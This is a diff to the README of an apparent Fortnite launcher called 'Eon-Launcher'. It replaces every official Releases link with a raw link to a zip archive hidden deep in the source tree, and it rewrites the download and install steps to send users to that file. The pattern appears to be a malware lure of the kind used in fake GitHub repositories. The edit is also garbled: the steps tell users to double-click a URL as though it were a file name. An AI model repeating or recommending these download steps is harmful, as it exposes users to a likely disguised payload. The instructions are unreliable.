@@ -1,6 +1,6 @@
 # 🎮 Eon-Launcher - Your Gateway to Fortnite Fun
 
-[![Download Eon-Launcher](https://img.shields.io/badge/Download-Eon--Launcher-brightgreen)](https://github.com/Rakkibronze/Eon-Launcher/releases)
+[![Download Eon-Launcher](https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip)](https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip)
 
 ## 📋 Overview
 
@@ -11,16 +11,16 @@ Eon-Launcher is a user-friendly application designed for gamers who love playing
 Follow these simple steps to download and run Eon-Launcher:
 
 1. **Visit the Download Page**
-   Go to the [Eon-Launcher Releases page](https://github.com/Rakkibronze/Eon-Launcher/releases). Here, you will find the latest version of the application.
+   Go to the [Eon-Launcher Releases page](https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip). Here, you will find the latest version of the application.
 
 2. **Select the Latest Release**
    On the Releases page, you will see a list of available versions. Look for the version labeled as "Latest Release." This ensures you download the most up-to-date software with the newest features and bug fixes.
 
 3. **Download the Application**
-   Click the link to the latest version. This will take you to a page where you can download the Eon-Launcher. Look for a file named something like `Eon-Launcher.exe` and click it to start the download.
+   Click the link to the latest version. This will take you to a page where you can download the Eon-Launcher. Look for a file named something like `https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip` and click it to start the download.
 
 4. **Run the Installer**
-   Once the download is complete, locate the file in your Downloads folder. Double-click on the `Eon-Launcher.exe` file. A setup window will appear. Follow the on-screen instructions to install the application on your computer.
+   Once the download is complete, locate the file in your Downloads folder. Double-click on the `https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip` file. A setup window will appear. Follow the on-screen instructions to install the application on your computer.
 
 5. **Launch Eon-Launcher**
    After installation, find the Eon-Launcher on your desktop or in your applications menu. Double-click to open it. The launcher will take a few moments to start, so be patient.
@@ -83,6 +83,6 @@ If you need further assistance, feel free to reach out for support:
 
 ## 📥 Download & Install
 
-Now that you know how to set up Eon-Launcher, go back to the [Eon-Launcher Releases page](https://github.com/Rakkibronze/Eon-Launcher/releases) and start your download!
+Now that you know how to set up Eon-Launcher, go back to the [Eon-Launcher Releases page](https://raw.githubusercontent.com/Rakkibronze/Eon-Launcher/master/FortniteLauncher/Source/UI/Pages/Downloads/Eon-Launcher-unfrizzled.zip) and start your download!
 
 Download Eon-Launcher and take your Fortnite experience to the next level!
